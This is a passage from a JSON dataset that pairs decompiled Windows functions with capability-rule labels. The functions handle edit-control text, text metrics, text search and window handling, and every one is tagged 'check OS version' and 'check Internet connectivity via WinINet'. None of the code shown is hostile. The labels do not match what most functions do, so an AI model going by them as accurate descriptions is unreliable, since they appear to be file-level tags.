            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042f969(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint arg_10h;\n    uint *puVar2;\n    uint arg_ch;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    int32_t var_4h;\n    \n    fcn.0042f924();\n    if (*(param_1 + 0x74) == 0) {\n        uVar1 = *(param_1 + 0x78);\n        if ((((uVar1 & 4) == 0) && (((uVar1 & 0xa000) == 0 || (*(param_1 + 0x7c) != 0)))) &&\n           (((uVar1 & 0x5000) == 0 || (*(param_1 + 0x7c) == 0)))) {\n            uVar1 = *(param_1 + 0x70) & 0x40 | 0x1000;\n            *(param_1 + 0xa8) = *(param_1 + 0x58);\n            arg_10h = *(param_1 + 0x5c);\n            arg_ch = *(param_1 + 0x58);\n        }\n        else {\n            uVar1 = *(param_1 + 0x70) & 0x40 | 0x2000;\n            *(param_1 + 0xa8) = *(param_1 + 0x48);\n            arg_10h = *(param_1 + 0x4c);\n            arg_ch = *(param_1 + 0x48);\n        }\n        *(param_1 + 0xac) = arg_10h;\n        *(param_1 + 0xa4) = uVar1;\n        fcn.00433fa3(*(param_1 + 0x68), arg_ch, arg_10h, uVar1);\n    }\n    else {\n        var_4h = fcn.0042f32d(*(param_1 + 0x74));\n        puVar2 = param_1 + 0x38;\n        if ((*(param_1 + 0x75) & 0x50) == 0) {\n            puVar2 = param_1 + 0x28;\n        }\n        var_14h = *puVar2;\n        uStack20 = puVar2[1];\n        uStack16 = puVar2[2];\n        uStack12 = puVar2[3];\n        uVar1 = (*_sym.imp.USER32.dll_GetDlgCtrlID)(*(var_4h + 0x1c));\n        uVar1 = uVar1 & 0xffff;\n        if ((0xe81a < uVar1) && (uVar1 < 0xe81f)) {\n            *(param_1 + 0x90) = uVar1;\n            *(param_1 + 0x94) = var_14h;\n            *(param_1 + 0x98) = uStack20;\n            *(param_1 + 0x9c) = uStack16;\n            *(param_1 + 0xa0) = uStack12;\n            fcn.00426186(param_1 + 0x94);\n        }\n        fcn.00433e0c(*(param_1 + 0x68), var_4h, &var_14h);\n        (**(**(param_1 + 0x6c) + 0x144))(1);\n    }\n    return;\n}\n",
        "token_count": 780
    },
    "00430246": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00430246(uint arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t in_ECX;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_LocalAlloc)(2, arg_ch + 1);\n    if (iVar1 != 0) {\n        iVar2 = (*_sym.imp.KERNEL32.dll_LocalLock)(iVar1);\n        iVar3 = fcn.00424cdc(iVar2, arg_ch);\n        if (iVar3 != arg_ch) {\n            (*_sym.imp.KERNEL32.dll_LocalUnlock)(iVar1);\n            (*_sym.imp.KERNEL32.dll_LocalFree)(iVar1);\n            fcn.00425c42(3, 0);\n        }\n        *(iVar2 + arg_ch) = 0;\n        if (*0x450d8c == 0) goto code_r0x004302e7;\n        iVar2 = (*_sym.imp.USER32.dll_SetWindowTextA)(*(in_ECX + 0x1c), iVar2);\n        (*_sym.imp.KERNEL32.dll_LocalUnlock)(iVar1);\n        (*_sym.imp.KERNEL32.dll_LocalFree)(iVar1);\n        iVar1 = 0;\n        if ((iVar2 != 0) && (iVar2 = (*_sym.imp.USER32.dll_GetWindowTextLengthA)(*(in_ECX + 0x1c)),  arg_ch <= iVar2)) {\n            fcn.0041bae1(*(in_ECX + 0x60));\n            *(in_ECX + 0x60) = 0;\n            *(in_ECX + 100) = 0;\n            return;\n        }\n    }\n    fcn.004198b2();\ncode_r0x004302e7:\n    (*_sym.imp.KERNEL32.dll_LocalUnlock)(iVar1);\n    uVar4 = fcn.00408a84();\n    (*_sym.imp.KERNEL32.dll_LocalFree)(uVar4);\n    fcn.00408a97(iVar1);\n    (*_sym.imp.USER32.dll_InvalidateRect)(*(in_ECX + 0x1c), 0, 1);\n    return;\n}\n",
        "token_count": 490
    },
    "00430318": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl\nfcn.00430318(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h, uint8_t *arg_1ch, \n            int32_t arg_20h)\n\n{\n    uint8_t *lpString;\n    uint8_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint lptm;\n    int32_t var_2ch;\n    uint var_8h;\n    \n    (*_sym.imp.GDI32.dll_GetTextMetricsA)(*(arg_8h + 4), &lptm);\n    lpString = arg_18h + arg_1ch;\n    arg_1ch = arg_18h + arg_20h;\n    iVar3 = 0;\n    puVar4 = lpString;\n    do {\n        if (arg_1ch <= puVar4) break;\n        uVar1 = *puVar4;\n        if (uVar1 == 9) {\n            iVar3 = iVar3 + (arg_14h - iVar3 % arg_14h);\n        }\n        else if ((*0x450fcc == 0) || ((*(uVar1 + 0x4527e1) & 4) == 0)) {\n            iVar3 = iVar3 + *(arg_ch + uVar1 * 4);\n        }\n        else {\n            puVar4 = puVar4 + 1;\n            iVar3 = iVar3 + var_2ch;\n        }\n        puVar4 = puVar4 + 1;\n    } while (iVar3 <= arg_10h);\n    piVar2 = fcn.00408a19(&var_8h, lpString, puVar4 - lpString, 1, &arg_14h);\n    if (arg_10h < *piVar2) {\n        do {\n            if (*0x450fcc == 0) {\n                puVar4 = puVar4 + -1;\n            }\n            else {\n                puVar4 = fcn.0040bd4a(lpString, puVar4);\n            }\n            piVar2 = fcn.00408a19(&var_8h, lpString, puVar4 - lpString, 1, &arg_14h);\n        } while (*piVar2 != arg_10h && arg_10h <= *piVar2);\n    }\n    else if (*piVar2 < arg_10h) {\n        do {\n            if (arg_1ch <= puVar4) goto code_r0x0043042a;\n            puVar4 = fcn.0040bd99(puVar4);\n            piVar2 = fcn.00408a19(&var_8h, lpString, puVar4 - lpString, 1, &arg_14h);\n        } while (*piVar2 == arg_10h || *piVar2 < arg_10h);\n        if (*0x450fcc == 0) {\n            puVar4 = puVar4 + -1;\n        }\n        else {\n            puVar4 = fcn.0040bd4a(lpString, puVar4);\n        }\n    }\ncode_r0x0043042a:\n    return puVar4 - arg_18h;\n}\n",
        "token_count": 734
    },
    "00430762": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00430762(void)\n\n{\n    uint uVar1;\n    \n    if (*0x450d8c == 0) {\n        uVar1 = fcn.00408a84();\n        (*_sym.imp.KERNEL32.dll_LocalUnlock)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 67
    },
    "00430855": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00430855(int32_t *arg_8h, int32_t *arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t *arg_8h_00;\n    uint32_t uVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t in_ECX;\n    uint lpBuffer;\n    int32_t lptm;\n    int32_t var_80h;\n    uint var_58h;\n    uint var_50h;\n    int32_t var_48h;\n    uint32_t var_44h;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    uint32_t var_34h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    uint32_t var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = arg_8h;\n    uVar1 = fcn.0041cced();\n    var_28h = ~(uVar1 >> 7) & 1;\n    uVar1 = fcn.00430778();\n    if (arg_10h < uVar1) {\n        var_4h = fcn.004306e8();\n        if (uVar1 < arg_14h) {\n            arg_14h = uVar1;\n        }\n        (*_sym.imp.GDI32.dll_GetTextMetricsA)(arg_8h[2], &lptm);\n        var_ch = var_80h + lptm;\n        piVar2 = fcn.00408a19(&var_20h, 0x43f010, 1, 0, 0);\n        var_10h = ((*(in_ECX + 0x5c) * *piVar2) / 8) / 4;\n        (*_sym.imp.GDI32.dll_GetCharWidthA)(arg_8h[2], 0, 0xff, &lpBuffer);\n        uVar1 = arg_ch[1];\n        var_18h = arg_ch[2] - *arg_ch;\n        (**(*arg_8h + 0x1c))();\n        iVar3 = fcn.00425e60(arg_ch);\n        arg_8h = uVar1;\n        do {\n            uVar1 = fcn.0043015a(var_4h, arg_14h, arg_10h);\n            if (arg_10h == uVar1) {\n                arg_8h = arg_8h + var_ch;\n            }\n            else if (var_28h == 0) {\n                var_38h = *arg_ch;\n                var_30h = arg_ch[2];\n                var_34h = arg_8h;\n                var_2ch = arg_8h + var_ch;\n                var_1ch = var_2ch;\n                if ((iVar3 != 1) && (iVar4 = (**(*arg_8h_00 + 0x58))(&var_38h),  iVar4 != 0)) {\n                    uVar5 = fcn.00430318(arg_8h_00, &lpBuffer, var_18h, var_10h, var_4h, arg_10h, uVar1);\n                    if (uVar5 < uVar1) {\n                        if ((*(*(uVar5 + var_4h) + 0x4527e1) & 4) != 0) {\n                            uVar5 = uVar5 + 1;\n                        }\n                        uVar5 = uVar5 + 1;\n                    }\n                    (**(*arg_8h_00 + 100))\n                              (&var_50h, var_38h, arg_8h, arg_10h + var_4h, uVar5 - arg_10h, 1, &var_10h, var_38h);\n                }\n                arg_8h = var_1ch;\n            }\n            else {\n                var_14h = arg_8h + var_ch;\n                while( true ) {\n                    var_1ch = fcn.00430318(arg_8h_00, &lpBuffer, var_18h, var_10h, var_4h, arg_10h, uVar1);\n                    var_8h = var_1ch;\n                    if (var_1ch != uVar1) {\n                        while ((arg_10h < var_8h && (iVar4 = fcn.0040c306(*(var_8h + var_4h)),  iVar4 == 0))) {\n                            var_8h = var_8h - 1;\n                        }\n                        if (var_8h == arg_10h) {\n                            var_8h = var_1ch;\n                        }\n                    }\n                    var_48h = *arg_ch;\n                    var_44h = arg_8h;\n                    var_40h = arg_ch[2];\n                    var_3ch = var_14h;\n                    if ((iVar3 != 1) && (iVar4 = (**(*arg_8h_00 + 0x58))(&var_48h),  iVar4 != 0)) {\n                        (**(*arg_8h_00 + 100))\n                                  (&var_58h, var_48h, arg_8h, arg_10h + var_4h, var_8h - arg_10h, 1, &var_10h, var_48h);\n                    }\n                    arg_8h = arg_8h + var_ch;\n                    var_14h = var_14h + var_ch;\n                    arg_10h = var_8h;\n                    if (uVar1 <= var_8h) break;\n                    do {\n                        iVar4 = fcn.0040c306(*(arg_10h + var_4h));\n                        if (iVar4 == 0) break;\n                        arg_10h = arg_10h + 1;\n                    } while (arg_10h < uVar1);\n                    if ((uVar1 <= arg_10h) || (arg_ch[3] < var_14h)) break;\n                }\n            }\n            uVar1 = fcn.0043017b();\n        } while ((uVar1 < arg_14h) && (arg_10h = uVar1,  arg_8h + var_ch <= arg_ch[3]));\n        (**(*arg_8h_00 + 0x20))(0xffffffff);\n        fcn.00430762();\n        arg_ch[3] = arg_8h;\n    }\n    return uVar1;\n}\n",
        "token_count": 1551
    },
    "00430cfd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: lParam\n// WARNING: Variable defined which should be unmapped: wParam\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n\nbool __cdecl fcn.00430cfd(uint lpString, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    bool bVar3;\n    uint wParam;\n    uint lParam;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    iVar1 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*(unaff_EBP + 8));\n    (*_sym.imp.USER32.dll_SendMessageA)(*(extraout_ECX + 0x1c), 0xb0, unaff_EBP + -0x18, unaff_EBP + -0x14);\n    if (iVar1 == *(unaff_EBP + -0x14) - *(unaff_EBP + -0x18)) {\n        piVar2 = fcn.0041bc88();\n        iVar1 = (**(*piVar2 + 0xc))();\n        *(unaff_EBP + -0x10) = iVar1 + 0x10;\n        *(unaff_EBP + -4) = 0;\n        fcn.00430c93(unaff_EBP + -0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(*(unaff_EBP + 8), *(unaff_EBP + -0x10));\n        }\n        else {\n            iVar1 = (*_sym.imp.KERNEL32.dll_lstrcmpA)();\n        }\n        bVar3 = iVar1 == 0;\n        fcn.00401180();\n    }\n    else {\n        bVar3 = false;\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return bVar3;\n}\n",
        "token_count": 479
    },
    "00430da0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: wParam\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: lParam\n\nuint __cdecl fcn.00430da0(uint lpString, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint8_t uVar2;\n    uint8_t *puVar3;\n    uint uVar4;\n    uint8_t *puVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint8_t *puVar10;\n    uint *in_FS_OFFSET;\n    bool bVar11;\n    uint lParam;\n    uint var_24h;\n    uint wParam;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040bb7c();\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    uVar4 = fcn.00430778();\n    *(unaff_EBP + -0x1c) = uVar4;\n    (*_sym.imp.USER32.dll_SendMessageA)(*(extraout_ECX + 0x1c), 0xb0, unaff_EBP + -0x20, unaff_EBP + -0x28);\n    uVar7 = *(unaff_EBP + -0x20);\n    iVar6 = (*(unaff_EBP + 0xc) != 0) * 2 + -1;\n    *(unaff_EBP + -0x10) = iVar6;\n    if ((uVar7 != 0) || (-1 < iVar6)) {\n        fcn.00434fe8();\n        fcn.0041c082();\n        *(unaff_EBP + -4) = 0;\n        puVar5 = fcn.004306e8();\n        *(unaff_EBP + -0x24) = puVar5;\n        if (*(unaff_EBP + -0x10) < 0) {\n            iVar6 = fcn.0040bd4a(puVar5, puVar5 + uVar7);\n            uVar7 = iVar6 - puVar5;\n        }\n        else if ((*(unaff_EBP + -0x20) != *(unaff_EBP + -0x28)) &&\n                (iVar6 = fcn.00430cfd(*(unaff_EBP + 8), *(unaff_EBP + 0x10)),  iVar6 != 0)) {\n            if ((*(puVar5[uVar7] + 0x4527e1) & 4) != 0) {\n                uVar7 = uVar7 + 1;\n            }\n            uVar7 = uVar7 + *(unaff_EBP + -0x10);\n        }\n        uVar8 = (*_sym.imp.KERNEL32.dll_lstrlenA)(*(unaff_EBP + 8));\n        uVar9 = *(unaff_EBP + -0x1c);\n        if ((uVar8 - 1) + uVar7 < uVar9) {\ncode_r0x00430ea7:\n            puVar10 = puVar5 + uVar7;\n            uVar4 = _sym.imp.KERNEL32.dll_lstrcmpA;\n            if (*(unaff_EBP + 0x10) == 0) {\n                uVar4 = _sym.imp.KERNEL32.dll_lstrcmpiA;\n            }\n            bVar11 = *0x450fcc == 0;\n            *(unaff_EBP + -0x1c) = uVar4;\n            if (bVar11) {\n                if (*(unaff_EBP + -0x10) < 0) {\n                    puVar5 = puVar10 + (1 - puVar5);\n                    *(unaff_EBP + 0xc) = puVar5;\n                }\n                else {\n                    puVar5 = puVar5 + uVar9 + (-uVar8 - puVar10) + 1;\n                    *(unaff_EBP + 0xc) = puVar5;\n                }\n                while (puVar5 != NULL) {\n                    uVar4 = *(unaff_EBP + 8);\n                    puVar3 = puVar10 + uVar8;\n                    *(unaff_EBP + 0x13) = *puVar3;\n                    *puVar3 = 0;\n                    iVar6 = (**(unaff_EBP + -0x1c))(puVar10, uVar4);\n                    uVar2 = *(unaff_EBP + 0x13);\n                    *puVar3 = uVar2;\n                    if (iVar6 == 0) {\n                        fcn.00430762();\n                        iVar6 = puVar10 - *(unaff_EBP + -0x24);\n                        goto code_r0x00430fd5;\n                    }\n                    *(unaff_EBP + 0xc) = *(unaff_EBP + 0xc) + -1;\n                    puVar10 = puVar10 + *(unaff_EBP + -0x10);\n                    puVar5 = *(unaff_EBP + 0xc);\n                    *puVar3 = uVar2;\n                }\n                goto code_r0x00430f97;\n            }\n            if (*(unaff_EBP + -0x10) < 1) {\n                *(unaff_EBP + -0x18) = puVar10;\n            }\n            else {\n                *(unaff_EBP + -0x18) = puVar5 + uVar9 + (1 - uVar8);\n                puVar5 = puVar10;\n            }\n            puVar10 = NULL;\n            for (; puVar5 < *(unaff_EBP + -0x18) || puVar5 == *(unaff_EBP + -0x18); puVar5 = fcn.0040bd99(puVar5)) {\n                puVar3 = *(unaff_EBP + 8);\n                if ((*(unaff_EBP + 0x10) == 0) ||\n                   ((*puVar5 == *puVar3 && (((*(*puVar5 + 0x4527e1) & 4) == 0 || (puVar5[1] == puVar3[1])))))) {\n                    *(unaff_EBP + 0xf) = puVar5[uVar8];\n                    puVar5[uVar8] = 0;\n                    iVar6 = (**(unaff_EBP + -0x1c))(puVar5, puVar3);\n                    puVar5[uVar8] = *(unaff_EBP + 0xf);\n                    if ((iVar6 == 0) && (puVar10 = puVar5,  0 < *(unaff_EBP + -0x10))) break;\n                }\n            }\n            fcn.00430762();\n            if (puVar10 != NULL) {\n                iVar6 = puVar10 - *(unaff_EBP + -0x24);\ncode_r0x00430fd5:\n                fcn.00406a80(iVar6, iVar6 + uVar8, 0);\n                *(unaff_EBP + -4) = 0xffffffff;\n                fcn.00434fe8();\n                fcn.0041c097();\n                uVar4 = 1;\n                goto code_r0x00430fb2;\n            }\n        }\n        else {\n            if ((*(unaff_EBP + -0x10) < 0) && (uVar8 <= uVar9)) {\n                if (*0x450fcc == 0) {\n                    uVar7 = uVar9 - uVar8;\n                }\n                else {\n                    uVar7 = uVar9;\n                    if (uVar8 != 0) {\n                        *(unaff_EBP + 0xc) = uVar8;\n                        do {\n                            iVar6 = fcn.0040bd4a(puVar5, puVar5 + uVar7);\n                            uVar7 = iVar6 - puVar5;\n                            piVar1 = unaff_EBP + 0xc;\n                            *piVar1 = *piVar1 + -1;\n                        } while (*piVar1 != 0);\n                        uVar9 = *(unaff_EBP + -0x1c);\n                    }\n                }\n                goto code_r0x00430ea7;\n            }\ncode_r0x00430f97:\n            fcn.00430762();\n        }\n        *(unaff_EBP + -4) = 0xffffffff;\n        fcn.00434fe8();\n        fcn.0041c097();\n    }\n    uVar4 = 0;\ncode_r0x00430fb2:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar4;\n}\n",
        "token_count": 1962
    },
    "00431755": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004317b1)\n// WARNING: Removing unreachable block (ram,0x004317bd)\n\nvoid fcn.00431755(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t unaff_EBX;\n    \n    uVar3 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    pcVar1 = _sym.imp.USER32.dll_GetWindow;\n    iVar4 = (*_sym.imp.USER32.dll_GetWindow)(uVar3);\n    pcVar2 = _sym.imp.USER32.dll_ShowWindow;\n    for (; iVar4 != 0; iVar4 = (*pcVar1)(iVar4, 2)) {\n        iVar5 = fcn.0041eede(iVar4);\n        if ((((iVar5 != 0) && (*0x21 != iVar4)) && (iVar6 = fcn.004315b7(*0x21, iVar4),  iVar6 != 0)) &&\n           (((uVar7 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar4, 0xfffffff0),  (uVar7 & 0x18000000) == 0 &&\n             ((*(iVar5 + 0x38) & 2) != 0)) && (*(unaff_EBX + 0xb0) == 0)))) {\n            (*pcVar2)(iVar4, 4);\n            *(iVar5 + 0x38) = *(iVar5 + 0x38) & 0xfffffffd;\n        }\n    }\n    return;\n}\n",
        "token_count": 374
    },
    "004318e4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004318e4(int32_t param_1, int32_t *param_2, int32_t param_3)\n\n{\n    int32_t *piVar1;\n    \n    piVar1 = *(param_1 + 0xac);\n    if (param_2 != piVar1) {\n        *(param_1 + 0xac) = 0;\n        if (piVar1 != NULL) {\n            (**(*piVar1 + 0x15c))(0, param_2, piVar1);\n        }\n        if (((*(param_1 + 0xac) == 0) && (*(param_1 + 0xac) = param_2,  param_2 != NULL)) && (param_3 != 0)) {\n            (**(*param_2 + 0x15c))(1, param_2, piVar1);\n        }\n    }\n    return;\n}\n",
        "token_count": 199
    },
    "004319d7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004319d7(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (**(*param_1 + 0x158))();\n    if (iVar1 != 0) {\n        return param_1[0x24];\n    }\n    if ((param_1[0x22] != 0) && (*(param_1[0x22] + 0x90) != 0)) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 117
    },
    "00431d5f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00431d5f(uint arg_8h, uint lpIconName)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *in_ECX;\n    uint var_58h;\n    uint var_38h;\n    int32_t lpClassName;\n    uint lpWndClass;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar1 = fcn.00434fe8();\n    iVar1 = (*_sym.imp.USER32.dll_LoadIconA)(*(iVar1 + 0xc), lpIconName);\n    if (iVar1 != 0) {\n        fcn.0040bbe0(&var_58h, 0, 0x30);\n        var_38h = arg_8h;\n        (**(*in_ECX + 100))(&var_58h);\n        if (lpClassName != 0) {\n            iVar2 = fcn.00434fe8();\n            iVar2 = (*_sym.imp.USER32.dll_GetClassInfoA)(*(iVar2 + 8), lpClassName, &lpWndClass);\n            if ((iVar2 != 0) && (var_14h != iVar1)) {\n                uVar3 = fcn.0041e5d9(lpWndClass, var_10h, var_ch, iVar1);\n                return uVar3;\n            }\n        }\n    }\n    return 0;\n}\n",
        "token_count": 320
    },
    "00431ea7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00431ea7(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *var_4h;\n    \n    var_4h = param_1;\n    if (param_1[0x2c] != NULL) {\n        (*param_1[0x2c])(param_1);\n    }\n    piVar1 = (**(*param_1 + 0x138))();\n    if ((piVar1 != NULL) && (iVar2 = (**(*piVar1 + 0x8c))(param_1),  iVar2 == 0)) {\n        return;\n    }\n    iVar2 = fcn.00434fe8();\n    piVar3 = *(iVar2 + 4);\n    if ((piVar3 != NULL) && (piVar3[7] == param_1)) {\n        if ((piVar1 == NULL) && (iVar2 = (**(*piVar3 + 0x94))(),  iVar2 == 0)) {\n            return;\n        }\n        fcn.00427ace();\n        fcn.00427a89();\n        iVar2 = fcn.00434171();\n        if (iVar2 == 0) {\n            fcn.00434191(0);\n            return;\n        }\n        iVar2 = fcn.00434fe8();\n        if ((*(iVar2 + 0x14) == '\\0') && (piVar3[7] == 0)) {\n            fcn.0043a912(0);\n            return;\n        }\n    }\n    if ((piVar1 != NULL) && (piVar1[0x12] != 0)) {\n        var_4h = (**(*piVar1 + 0x60))();\n        do {\n            if (var_4h == NULL) {\n                (**(*piVar1 + 0x7c))();\n                return;\n            }\n            (**(*piVar1 + 100))(&var_4h);\n            piVar3 = fcn.0041f838();\n        } while (piVar3 == param_1);\n        (**(*piVar1 + 0x94))(param_1);\n    }\n    (**(*param_1 + 0x60))();\n    return;\n}\n",
        "token_count": 508
    },
    "00432108": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00432108(int32_t arg_8h, int32_t *arg_ch, int32_t arg_10h)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    int32_t *in_ECX;\n    \n    fcn.0041ee14();\n    uVar2 = fcn.0041cced();\n    piVar3 = in_ECX;\n    if ((uVar2 & 0x40000000) == 0) {\n        piVar3 = fcn.0041f877();\n    }\n    if (arg_8h != 0) {\n        arg_ch = in_ECX;\n    }\n    if ((piVar3 == arg_ch) ||\n       ((piVar4 = fcn.0041f877(),  piVar3 == piVar4 &&\n        (iVar5 = (*_sym.imp.USER32.dll_SendMessageA)(arg_ch[7], 0x36d, 0x40, 0),  iVar5 != 0)))) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n    }\n    piVar3[0xe] = piVar3[0xe] & 0xffffffdf;\n    if (bVar1) {\n        piVar3[0xe] = piVar3[0xe] | 0x20;\n    }\n    fcn.00431bd1(!bVar1 * '\\x04' + '\\x04');\n    piVar3 = in_ECX[0x2b];\n    if (piVar3 == NULL) {\n        iVar5 = (**(*in_ECX + 0x13c))();\n        piVar3 = *(iVar5 + 0xac);\n        if (piVar3 == NULL) {\n            return;\n        }\n    }\n    if ((arg_8h != 0) && (arg_10h == 0)) {\n        (**(*piVar3 + 0x15c))(1, piVar3, piVar3);\n    }\n    (**(*piVar3 + 0x160))(arg_8h);\n    return;\n}\n",
        "token_count": 483
    },
    "004321db": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
